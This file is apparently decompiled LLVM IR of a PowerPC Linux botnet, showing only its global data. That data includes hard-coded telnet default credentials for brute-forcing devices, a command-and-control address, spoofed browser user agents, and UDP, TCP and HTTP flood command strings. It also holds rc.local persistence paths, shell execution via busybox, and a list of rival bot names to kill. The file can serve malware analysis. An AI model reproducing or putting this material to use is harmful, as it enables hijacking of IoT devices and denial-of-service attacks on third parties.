source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4 = internal unnamed_addr global i4 0
@lr = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_100000a4.1 = constant i32 1208023901
@global_var_1002300c.3 = global i32 0
@global_var_1002301c.4 = local_unnamed_addr global i32* @global_var_1002300c.3
@global_var_10010000.5 = constant [31 x i8] c"0 Mobile/12H143 Safari/600.1.4\00"
@global_var_10023598.8 = global i32 0
@global_var_10023010.9 = global i32 0
@global_var_100235b0.10 = global i32 0
@global_var_100235b4.11 = local_unnamed_addr global i32 0
@global_var_100235b8.12 = local_unnamed_addr global i32 0
@global_var_1002319c.13 = local_unnamed_addr global i32 4095
@global_var_10023198.14 = local_unnamed_addr global i32 362436
@global_var_10010c4c.15 = constant [7 x i8] c"(null)\00"
@global_var_10023534.16 = local_unnamed_addr global i32 0
@global_var_100013c0.17 = constant i32 1207984853
@global_var_1000140c.18 = constant i32 939589631
@global_var_10001460.19 = constant i32 1207959608
@global_var_10010c54.20 = constant [8 x i8] c"/bin/sh\00"
@global_var_10010c5c.21 = constant [3 x i8] c"sh\00"
@global_var_10010c60.22 = constant [3 x i8] c"-c\00"
@global_var_100014c0.23 = constant [3 x i8] c"8`\00"
@global_var_100014f0.24 = constant i32 1207959576
@global_var_10010c64.25 = constant i32 -1
@global_var_10001c38.26 = constant i32 939524126
@global_var_10023510.27 = local_unnamed_addr global i32 0
@global_var_10010c3c.28 = constant [8 x i8] c"busybox\00"
@global_var_10010c44.29 = constant i32 603979776
@global_var_10010c48.30 = constant i32 587202560
@global_var_1002315c.31 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10010c3c.28, i32 0, i32 0), i8* bitcast (i32* @global_var_10010c44.29 to i8*), i8* bitcast (i32* @global_var_10010c48.30 to i8*)]
@global_var_10010c04.32 = constant [7 x i8] c"nvalid\00"
@global_var_10010c0c.33 = constant [6 x i8] c"ailed\00"
@global_var_10010c14.34 = constant [9 x i8] c"ncorrect\00"
@global_var_10010c20.35 = constant [6 x i8] c"enied\00"
@global_var_10010c28.36 = constant [5 x i8] c"rror\00"
@global_var_10010c30.37 = constant [7 x i8] c"oodbye\00"
@global_var_10010c38.38 = constant [4 x i8] c"bad\00"
@global_var_1002313c.39 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10010c04.32, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10010c0c.33, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10010c14.34, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10010c20.35, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10010c28.36, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10010c30.37, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10010c38.38, i32 0, i32 0)]
@global_var_10002494.40 = constant i32 939524098
@global_var_1000269c.41 = constant i32 939524097
@global_var_10023518.42 = global i32 0
@global_var_1002351c.43 = local_unnamed_addr global i32 0
@global_var_10023544.44 = local_unnamed_addr global i32 0
@global_var_10002a14.45 = constant i32 939524096
@global_var_10011064.46 = constant [6 x i8] c":>%$#\00"
@global_var_1001106c.51 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_10023538.52 = local_unnamed_addr global i32 0
@global_var_1000384c.53 = constant i32 939524096
@global_var_10003a0c.54 = constant i32 939524098
@global_var_10003ac8.55 = constant i32 939524096
@global_var_10010b88.56 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_10010b98.57 = constant [6 x i8] c"/tmp/\00"
@global_var_10010ba0.58 = constant [6 x i8] c"/var/\00"
@global_var_10010ba8.59 = constant [6 x i8] c"/dev/\00"
@global_var_10010bb0.60 = constant [10 x i8] c"/var/run/\00"
@global_var_10010bbc.61 = constant [10 x i8] c"/dev/shm/\00"
@global_var_10010bc8.62 = constant [6 x i8] c"/mnt/\00"
@global_var_10010bd0.63 = constant [7 x i8] c"/boot/\00"
@global_var_10010bd8.64 = constant [6 x i8] c"/usr/\00"
@global_var_10010be0.65 = constant [6 x i8] c"/opt/\00"
@global_var_100230fc.66 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_10010b88.56, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10010b98.57, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10010ba0.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10010ba8.59, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10010bb0.60, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10010bbc.61, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10010bc8.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10010bd0.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10010bd8.64, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10010be0.65, i32 0, i32 0)]
@global_var_100110ec.67 = constant i32 -54436
@global_var_10003f54.68 = constant i32 1207962236
@global_var_10003f74.69 = constant i32 1207962204
@global_var_10010b3c.81 = constant [7 x i8] c"telnet\00"
@global_var_10010b44.82 = constant [5 x i8] c"root\00"
@global_var_10010b4c.83 = constant [8 x i8] c"default\00"
@global_var_10010b58.84 = constant [7 x i8] c"daemon\00"
@global_var_10010b60.85 = constant [8 x i8] c"support\00"
@global_var_10010b6c.86 = constant i32 0
@global_var_10010b70.87 = constant [7 x i8] c"123456\00"
@global_var_10010b78.88 = constant [7 x i8] c"Zte521\00"
@global_var_10010b80.89 = constant [6 x i8] c"vizxv\00"
@global_var_1001110c.114 = constant [6 x i8] c"arfgG\00"
@global_var_10011114.115 = constant [9 x i8] c"HBiug655\00"
@global_var_10011120.116 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_10011130.117 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_10011144.118 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_10011158.119 = constant [12 x i8] c"GJjyur67458\00"
@global_var_10011164.120 = constant [12 x i8] c"RYSDk747586\00"
@global_var_10011170.121 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_1001117c.122 = constant [10 x i8] c"KHGK7985i\00"
@global_var_10011188.123 = constant [11 x i8] c"yuituiILYF\00"
@global_var_10011194.124 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_100111a4.125 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_100111b0.126 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_100111c0.127 = constant [9 x i8] c"ewqdcftr\00"
@global_var_100111cc.128 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_100111dc.129 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_100111e8.130 = constant [12 x i8] c"twehgbferhb\00"
@global_var_100111f4.131 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_10011200.132 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_10011210.133 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_10011220.134 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_10011230.135 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_1001123c.136 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_1001124c.137 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_1001125c.138 = constant [12 x i8] c"yteytietyue\00"
@global_var_10011268.139 = constant [9 x i8] c"qsortEQS\00"
@global_var_10011274.140 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_10011284.141 = constant [4 x i8] c"std\00"
@global_var_10011288.142 = constant [4 x i8] c"dts\00"
@global_var_1001128c.143 = constant [4 x i8] c"lsk\00"
@global_var_10011290.144 = constant [4 x i8] c"kek\00"
@global_var_10011294.145 = constant [6 x i8] c"smack\00"
@global_var_1001129c.146 = constant [4 x i8] c"ily\00"
@global_var_100112a0.147 = constant [4 x i8] c"tyf\00"
@global_var_100112a4.148 = constant [4 x i8] c"pos\00"
@global_var_100112a8.149 = constant [6 x i8] c"cunts\00"
@global_var_100112b0.150 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001110c.114, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10011114.115, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10011120.116, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_10011130.117, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_10011144.118, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011158.119, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011164.120, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10011170.121, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001117c.122, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10011188.123, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011194.124, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100111a4.125, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100111b0.126, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100111c0.127, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_100111cc.128, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100111dc.129, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100111e8.130, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100111f4.131, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011200.132, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011210.133, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10011220.134, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10011230.135, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1001123c.136, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1001124c.137, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001125c.138, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10011268.139, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10011274.140, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011284.141, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011288.142, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001128c.143, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10011290.144, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10011294.145, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001129c.146, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100112a0.147, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_100112a4.148, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100112a8.149, i32 0, i32 0)]
@global_var_10004ae0.151 = constant i32 1207986529
@global_var_10004b60.152 = constant [3 x i8] c"8`\00"
@global_var_10004b88.153 = constant [3 x i8] c"8`\00"
@global_var_10004b90.154 = constant i32 939524096
@global_var_1000fc90.155 = constant [64 x i8] c"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_1000fcd0.156 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_1000fd14.157 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_1000fd58.158 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_1000fd9c.159 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_1000fde0.160 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_1000fe24.161 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_1000fe68.162 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_1000fed8.163 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_1000ff4c.164 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_1000ff98.165 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_10010020.166 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_1001006c.167 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_100100dc.168 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_1001014c.169 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_100101c0.170 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_10010238.171 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_10010280.172 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_100102b0.173 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_100102f0.174 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_1001033c.175 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_100103b4.176 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_10010424.177 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_10010494.178 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_10010508.179 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_1001059c.180 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_100105e4.181 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_1001062c.182 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_1001066c.183 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_100106e8.184 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_10010750.185 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_100107cc.186 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_1001081c.187 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_10010870.188 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_100108c4.189 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_10010918.190 = constant [83 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\00"
@global_var_10023024.191 = global [36 x i8*] [i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1000fc90.155, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @global_var_1000fcd0.156, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1000fd14.157, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1000fd58.158, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1000fd9c.159, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1000fde0.160, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1000fe24.161, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_1000fe68.162, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1000fed8.163, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1000ff4c.164, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @global_var_1000ff98.165, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_10010020.166, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_1001006c.167, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_100100dc.168, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1001014c.169, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @global_var_100101c0.170, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10010238.171, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_10010280.172, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_100102b0.173, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_100102f0.174, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @global_var_1001033c.175, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @global_var_100103b4.176, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_10010424.177, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_10010494.178, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @global_var_10010508.179, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_1001059c.180, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_100105e4.181, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1001062c.182, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_1001066c.183, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @global_var_100106e8.184, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_10010750.185, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_100107cc.186, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_1001081c.187, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_10010870.188, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_100108c4.189, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_10010918.190, i32 0, i32 0)]
@global_var_10011340.192 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_10004c78.193 = constant i32 1207970857
@global_var_10004cf4.194 = constant [3 x i8] c"8`\00"
@global_var_10004e80.195 = constant [3 x i8] c"8`\00"
@global_var_10004f4c.196 = constant [3 x i8] c"9 \00"
@global_var_10004ffc.197 = constant i32 1207985221
@global_var_10005328.198 = constant [3 x i8] c"9 \00"
@global_var_10011380.199 = constant [4 x i8] c"all\00"
@global_var_10011384.200 = constant i32 738197504
@global_var_10011388.201 = constant [4 x i8] c"syn\00"
@global_var_1001138c.202 = constant [4 x i8] c"rst\00"
@global_var_10011390.203 = constant [4 x i8] c"fin\00"
@global_var_10011394.204 = constant [4 x i8] c"ack\00"
@global_var_10011398.205 = constant [4 x i8] c"psh\00"
@global_var_1001139c.206 = constant [5 x i8] c"PING\00"
@global_var_100113a4.207 = constant [6 x i8] c"PUSSY\00"
@global_var_100113ac.208 = constant [4 x i8] c"OFF\00"
@global_var_10023540.209 = local_unnamed_addr global i32 0
@global_var_100113b0.210 = constant [3 x i8] c"ON\00"
@global_var_10005ac8.211 = constant [3 x i8] c"8`\00"
@global_var_100113b4.212 = constant [5 x i8] c"HTTP\00"
@global_var_100113bc.213 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_10005c60.214 = constant [3 x i8] c"8`\00"
@global_var_100113e4.215 = constant [4 x i8] c"UDP\00"
@global_var_10005f68.216 = constant [3 x i8] c"8`\00"
@global_var_10005f70.217 = constant [3 x i8] c"8`\00"
@global_var_10005fcc.218 = constant [3 x i8] c"8`\00"
@global_var_100113e8.219 = constant [4 x i8] c"TCP\00"
@global_var_1000623c.220 = constant [3 x i8] c"8`\00"
@global_var_10006244.221 = constant [3 x i8] c"8`\00"
@global_var_1000629c.222 = constant [3 x i8] c"8`\00"
@global_var_100113ec.223 = constant [4 x i8] c"STD\00"
@global_var_100063bc.224 = constant [3 x i8] c"8`\00"
@global_var_100063c4.225 = constant [3 x i8] c"8`\00"
@global_var_1000640c.226 = constant [3 x i8] c"8`\00"
@global_var_100113f0.227 = constant [5 x i8] c"STOP\00"
@global_var_100234d0.228 = local_unnamed_addr global i32 -1
@global_var_1001096c.229 = constant [20 x i8] c"188.166.150.230:123\00"
@global_var_100234c8.230 = global [20 x i8]* @global_var_1001096c.229
@global_var_10006628.231 = constant i32 939524219
@global_var_100113f8.232 = constant [8 x i8] c"8.8.8.8\00"
@global_var_10011400.233 = constant [16 x i8] c"/proc/net/route\00"
@global_var_10011410.234 = constant [11 x i8] c"\0900000000\09\00"
@global_var_1000692c.235 = constant i32 939524096
@global_var_10023520.236 = global i32 0
@global_var_10006980.237 = constant i32 1207959564
@global_var_1001141c.238 = constant [8 x i8] c"POWERPC\00"
@global_var_10011424.239 = constant i32 0
@global_var_10006a64.240 = constant [3 x i8] c"8`\00"
@global_var_10006a84.241 = constant [3 x i8] c"8`\00"
@global_var_10006aa4.242 = constant i32 939524096
@global_var_10011428.243 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 1912602624
@global_var_10011440.245 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_10011450.246 = constant i32 788529152
@global_var_10011454.247 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_10006bc0.248 = constant i32 1207959620
@global_var_1001145c.249 = constant i32 1627389952
@global_var_10006c68.250 = constant i32 1207959576
@global_var_10006c74.251 = constant i32 1207959564
@global_var_10006c84.252 = constant i32 1207962653
@global_var_10006cb0.253 = constant [3 x i8] c"8`\00"
@global_var_10011460.254 = constant [13 x i8] c"fork failed\0A\00"
@global_var_10006d04.255 = constant i32 1207959576
@global_var_10006d1c.256 = constant i32 1207963553
@global_var_10006d2c.257 = constant [3 x i8] c"8`\00"
@global_var_10006d38.258 = constant i32 1207959556
@global_var_10011470.259 = constant i32 458961211
@global_var_10006da0.260 = constant i32 939524096
@global_var_100114d8.261 = constant [9 x i8] c"LELIMDUP\00"
@global_var_100114e4.262 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_100114f8.263 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_10011504.264 = constant [8 x i8] c"%s 2>&1\00"
@global_var_100073b8.265 = constant [3 x i8] c"8`\00"
@global_var_100073e8.266 = constant [3 x i8] c"8`\00"
@global_var_100073f0.267 = constant i32 939524097
@global_var_1001150c.268 = constant i32 536870912
@global_var_1000762c.269 = constant i32 1207959564
@global_var_100079c8.270 = constant i32 1207959560
@global_var_10023560.271 = local_unnamed_addr global i32 0
@global_var_10007d38.272 = constant i32 939524118
@global_var_100234d8 = external local_unnamed_addr global i32
@global_var_10023570.278 = global i32 0
@global_var_1000bfac.279 = constant [3 x i8] c"8`\00"
@global_var_100231b8.280 = global i32 0
@global_var_10023548.281 = local_unnamed_addr global i32 0
@global_var_1002354c.282 = local_unnamed_addr global i32 0
@global_var_10007f88.283 = constant i32 1207965629
@global_var_10008170.284 = constant i32 1207960120
@global_var_100234fc.285 = local_unnamed_addr global i32 2
@global_var_100231a0.286 = global i32 0
@global_var_100234f8.287 = global i32* bitcast (i16* @global_var_100231d0.275 to i32*)
@global_var_100083a4.288 = constant i32 1207959560
@global_var_100083f4.289 = constant [3 x i8] c" c\00"
@global_var_10008410.290 = constant [3 x i8] c" c\00"
@global_var_10011b10.291 = constant i32 0
@global_var_100086ac.292 = constant i32 1207961092
@global_var_100087d8.293 = constant i32 1207960768
@global_var_10011b44.294 = constant i32 269488136
@global_var_10011b28.295 = constant [6 x i8] c"(nil)\00"
@global_var_10011b30.296 = constant [7 x i8] c"(null)\00"
@global_var_10011b38.297 = constant i32 721431808
@global_var_10008c34.298 = constant i32 939524096
@global_var_10011bc4.299 = constant i32 65793
@global_var_10011bac.300 = constant i32 524293
@global_var_10011ba4.301 = constant [8 x i8] c" +0-#'I\00"
@global_var_10011b4c.302 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_10011b8c.303 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_10011b80.304 = constant i32 67343
@global_var_10011b7f.305 = constant i32 50331911
@global_var_10011b70.306 = constant i32 268435461
@global_var_10011b60.307 = constant i32 520093701
@global_var_100095f0.308 = constant [3 x i8] c"8a\00"
@global_var_10009918.309 = constant i32 1207959708
@global_var_100099c0.310 = constant i32 1207959612
